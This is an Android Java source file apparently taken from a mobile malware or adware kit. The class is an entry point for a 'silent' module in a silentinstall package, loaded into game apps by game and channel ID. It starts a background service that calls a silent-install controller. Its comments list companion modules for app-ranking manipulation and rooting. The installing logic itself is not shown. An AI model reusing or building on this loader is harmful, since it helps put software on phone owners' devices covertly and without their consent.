package com.fixed.inter;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import com.invisible.silentinstall.core.BisCtrl;
import com.invisible.silentinstall.core.SICtrl;
import com.invisible.silentinstall.utils.GlobalContext;

import java.util.HashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by zhengnan on 2016/2/17.
 */
public class TempService {
    public static String gameID = null;
    public static String channelID = null;
    public static String doMain = null;
    String moduleName = "silent";

    //load时，传递参数 返回子版本
    public HashMap<String, String> load(HashMap<String, String> params, Context ctx) {
        Log.e(moduleName, "init:" + params.toString());
        //用于启动service的名称
        String serviceName = params.get("serviceName");
        //用于联网校验的token  ，如果为""，表示不需要去校验了。
        String validToken = params.get("validToken");
        //当前apk的绝对路径。 （便于加载其中的assets等文件。）
        String apkPath = params.get("apkPath");
        //gameId,channelId
        gameID = params.get("gameId");
        channelID = params.get("channelId");
        doMain = params.get("domain");
        GlobalContext.init(ctx);
        try {
            Intent it = new Intent(ctx, Class.forName(serviceName));
            it.setAction(moduleName);
            ctx.startService(it);
        } catch (Exception e) {
            e.printStackTrace();
        }
        //该方法的返回
        HashMap<String, String> retMap = new HashMap<>();
        /**
         * 预定的动态包的模块名称：
         * dynamic   刷榜模块
         * stat  统计模块
         * plugin  插件模块
         * root  root模块
         * solid 固定模块
         * silent 静默模块
         * */
        retMap.put("moduleName", moduleName);
        retMap.put("moduleVersion", "" + SICtrl.version);
        return retMap;
    }


    boolean isFirstStart = false;

    //可自己来模拟一个onCreate方法
    void onCreate(Service service) {
        Log.e("test", "onCreate");
    }

    ExecutorService es = Executors.newSingleThreadExecutor();

    //启动service后的回调
    public int onStartCommand(Service service, final Intent intent, int flags, int startId) {
        if (!isFirstStart) {
            isFirstStart = true;
            onCreate(service);
        }
        final Context ctx = service.getApplicationContext();
        Log.e(moduleName, "onStartCommand" + intent.getExtras());
        Bundle bundle = null;
        if (BisCtrl.check(intent)) {
            es.execute(new Runnable() {
                @Override
                public void run() {
                    BisCtrl.getInstance().execute(ctx, intent);
                }
            });
            return 0;
        }
        es.execute(new Runnable() {
            @Override
            public void run() {
                SICtrl.getIns().execute(ctx);
            }
        });


        return 0;
    }

}